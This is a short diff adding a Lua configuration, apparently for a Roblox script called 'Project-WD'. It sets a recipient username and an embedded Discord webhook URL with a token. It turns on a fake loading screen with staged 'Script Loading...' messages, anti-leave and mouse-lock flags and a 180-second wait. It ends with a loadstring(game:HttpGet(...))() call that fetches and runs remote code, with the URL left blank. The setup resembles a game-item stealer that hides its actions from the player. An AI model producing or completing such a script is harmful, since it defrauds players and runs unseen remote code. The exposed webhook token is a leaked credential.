@@ -1,0 +1,11 @@
+UserName = "itsyoboykobe115" 
+
+Webhook = "https://discord.com/api/webhooks/1109456663703982141/ZVeISSeF6L5QwrByIg2wKS-vbOHGtjgCbeLGlOnlny43BMe8EBhkcMjTafzXoUGxVXU5" 
+
+_G.LoadingScreen = true 
+
+_G.AntiLeave = true 
+
+_G.MouseLock = true 
+
+_G.ScriptName = "Project-WD" _G.FirstText = "Script Preparing" _G.SecondText = "Script Loading..." _G.ThirdText = "Almost Done..." _G.WaitingTime = 180 loadstring(game:HttpGet("", true))()
